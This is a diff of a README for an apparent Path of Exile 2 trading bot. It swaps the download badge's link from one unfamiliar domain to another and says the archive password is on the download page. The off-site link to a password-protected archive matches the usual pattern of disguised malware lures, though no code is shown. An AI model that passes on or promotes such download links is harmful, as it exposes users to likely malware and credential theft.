@@ -18,7 +18,7 @@ Automate Path of Exile 2 trading. Monitors the trade site for underpriced items,
 
 ## Download
 
-[![Download v1.4.0](https://img.shields.io/badge/Download_v1.4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/poe2bot)
+[![Download v1.4.0](https://img.shields.io/badge/Download_v1.4.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/poe2bot)
 
 > The archive password is shown on the download page.
 
